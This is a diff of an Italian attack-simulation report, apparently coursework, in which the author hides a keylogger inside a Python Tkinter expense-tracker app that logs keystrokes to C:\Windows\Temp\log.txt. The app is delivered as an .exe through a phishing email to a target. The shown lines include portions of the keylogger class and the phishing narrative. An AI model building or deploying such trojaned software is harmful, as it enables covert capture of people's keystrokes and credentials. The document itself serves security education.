@@ -77,7 +77,7 @@ Faccio una ricerca sui social media e scopro che Alessandro è un grande appassi
 ### 1. Programmazione del Keylogger e dell'interfaccia grafica del gestore
 
 Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger (utilizzando la piattaforma Visual Code Studio [8]).
-Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file log.txt nella cartella C:\Windows\Temp da me scelta. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
+Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file di nome "log.txt" nella cartella "C:\Windows\Temp" da me scelta. La scelta della cartella è stata arbitraria, potevo scegliere qualsiasi altro percorso. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
 
 ```python
 
@@ -144,7 +144,11 @@ update_table()
 
 window.mainloop()
 
-class KeyLogger:
+# INIZIO DEL KEY LOGGER
+class KeyLogger: 
+
+    # Scelta della directory e del nome del file
+
     def __init__(self, log_directory=r"C:\windows\temp", log_file_name="log.txt"):
         self.log_directory = log_directory or os.path.join(os.path.expanduser("~"), "logs")
         self.log_file_name = log_file_name
@@ -162,18 +166,20 @@ class KeyLogger:
             char = key.char
         except AttributeError:
             char = str(key)
+        # Aggiunta del giorno e dell'ora della pressione del tasto
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         log_message = f"{timestamp} - Pressed: {char}\n"
         self.log(log_message)
         print(log_message, end='')
 
     def on_release(self, key):
+        # Aggiunta del giorno e dell'ora del rilascio del tasto
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         log_message = f"{timestamp} - Released: {key}\n"
         self.log(log_message)
         print(log_message, end='')
         
-        # Optional: Stop the listener if a specific key is released
+        # ferma il keylogger al rilascio del tasto esc. Questa opzione è stata inserita in fase di test per fermarne l'esecuzione
         if key == 'Key.esc':
             return False
 
@@ -228,7 +234,7 @@ Il Team di Gestore di Spesa
 
 </blockquote>
 
-Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Gestore di spesa.exe" che è il file malevolo creato da me (l'attaccante).
+Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Manager spesa.exe" che è il file malevolo creato da me (l'attaccante).
 
 ### 3. Funzionamento del Software Malevolo
 
@@ -296,10 +302,10 @@ Esempio del file log.txt ottenuto:
 
 Gli eventi chiave dell'attacco sono:
 
-+ la non regolamentazione dei privilegi dell'utente;
++ l'assenza di regolamentazione dei privilegi dell'utente;
 + l'assenza di limitazione all'accesso dei servizi SMB e SSH;
 + l'uso di credenziali predefinite da parte dell'amministratore;
-+ è stato necessario l'aiuto dell'utente per eseguire il programma malevolo.
++ l'aiuto da parte dell'utente è stato necessario per eseguire il programma malevolo.
 
 </div>
 
